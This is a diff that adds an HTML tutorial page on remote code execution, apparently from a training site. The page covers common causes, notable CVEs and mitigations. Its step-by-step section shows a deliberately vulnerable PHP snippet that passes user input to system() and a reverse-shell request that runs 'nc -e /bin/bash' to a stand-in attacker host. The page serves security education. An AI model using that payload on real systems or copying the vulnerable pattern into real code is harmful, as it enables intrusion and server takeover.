@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Remote Code Execution (RCE) - Cybersecurity Academy</title>
+  <link rel="stylesheet" href="style.css"/>
+  <script src="scripts.js" defer></script>
+</head>
+<body class="dark-theme">
+
+  <header class="site-header">
+    <h1>💥 Remote Code Execution (RCE)</h1>
+    <p class="subtitle">One of the most critical vulnerabilities – understand it, exploit it, and secure against it.</p>
+  </header>
+
+  <main class="content">
+
+    <section class="intro">
+      <h2>🔎 What is Remote Code Execution?</h2>
+      <p>
+        Remote Code Execution (RCE) is a severe vulnerability that allows an attacker to execute arbitrary code on a remote server or system. Exploiting RCE can lead to full system compromise, data theft, persistence, lateral movement, and more. RCE vulnerabilities often arise due to poor input validation, insecure system calls, or misconfigured components.
+      </p>
+    </section>
+
+    <section class="types">
+      <h2>🧩 Common Causes of RCE</h2>
+      <ul>
+        <li>Insecure use of <code>eval()</code> or <code>exec()</code> functions</li>
+        <li>Command injection via unsanitized user input</li>
+        <li>Unsafe deserialization</li>
+        <li>Insecure file upload and execution</li>
+        <li>Third-party plugins or dependencies</li>
+      </ul>
+    </section>
+
+    <section class="step-by-step">
+      <h2>🚀 Step-by-Step: Exploiting RCE (Educational Purpose Only)</h2>
+
+      <div class="card">
+        <h3>🛠️ Scenario: PHP-based Web Application</h3>
+        <p>The following vulnerable code is found in a PHP file:</p>
+        <pre><code>// vulnerable.php
+&lt;?php
+$cmd = $_GET['cmd'];
+system($cmd);
+?&gt;</code></pre>
+        <p>This code executes user-supplied input directly via <code>system()</code>.</p>
+
+        <h4>✔️ Proof of Concept</h4>
+        <p>Sending a GET request to the server:</p>
+        <pre><code>http://vulnerable-site.com/vulnerable.php?cmd=whoami</code></pre>
+
+        <p><strong>Expected Response:</strong></p>
+        <pre><code>www-data</code></pre>
+      </div>
+
+      <div class="card">
+        <h3>💣 Real-World Exploitation</h3>
+        <p>Attackers can chain this with reverse shells:</p>
+        <pre><code>http://vulnerable-site.com/vulnerable.php?cmd=nc -e /bin/bash attacker.com 4444</code></pre>
+        <p><strong>Tip:</strong> Use URL encoding for special characters and set up a listener with <code>nc -lvnp 4444</code>.</p>
+      </div>
+    </section>
+
+    <section class="real-world">
+      <h2>🌐 Notable RCE Vulnerabilities</h2>
+      <ul>
+        <li><strong>Log4Shell (CVE-2021-44228):</strong> Remote code execution via log injection in Java</li>
+        <li><strong>Apache Struts2 (CVE-2017-5638):</strong> RCE via Content-Type header</li>
+        <li><strong>Drupalgeddon2 (CVE-2018-7600):</strong> RCE in Drupal core</li>
+      </ul>
+    </section>
+
+    <section class="defense">
+      <h2>🛡️ Defense & Mitigation Strategies</h2>
+      <ul>
+        <li>Never trust user input – validate and sanitize it</li>
+        <li>Avoid functions like <code>eval</code>, <code>exec</code>, <code>system</code>, or sandbox them properly</li>
+        <li>Use allowlists instead of blacklists</li>
+        <li>Implement proper Content Security Policies (CSP)</li>
+        <li>Keep all components and dependencies updated</li>
+        <li>Run services with least privilege (e.g., non-root users)</li>
+        <li>Use Web Application Firewalls (WAFs) to block suspicious input</li>
+      </ul>
+    </section>
+
+    <section class="tips">
+      <h2>💡 Practical Tips for Pentesters</h2>
+      <ul>
+        <li>Use Burp Suite to modify and replay requests with payloads</li>
+        <li>Use payloads from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">PayloadsAllTheThings</a></li>
+        <li>Leverage <code>curl</code>, <code>wget</code>, or <code>netcat</code> for command execution testing</li>
+        <li>Check for output reflection (response body or headers)</li>
+        <li>Try blind RCE techniques using DNS or HTTP callbacks (e.g., Burp Collaborator)</li>
+      </ul>
+    </section>
+
+    <section class="resources">
+      <h2>📚 Learning Resources</h2>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/Code_Injection" target="_blank">OWASP Code Injection</a></li>
+        <li><a href="https://gtfobins.github.io/" target="_blank">GTFOBins (for Linux privilege escalation)</a></li>
+        <li><a href="https://book.hacktricks.xyz/pentesting-web/command-injection" target="_blank">HackTricks – Command Injection</a></li>
+        <li><a href="https://www.exploit-db.com/" target="_blank">Exploit-DB</a></li>
+      </ul>
+    </section>
+
+  </main>
+
+  <footer class="site-footer">
+    <p>BugDrillX © 2025 – Learn. Hack. Evolve. powered by <a href="https://pk.linkedin.com/company/scoltech" target="_blank">SCOLTECH</a></p>
+  </footer>
+
+</body>
+</html>
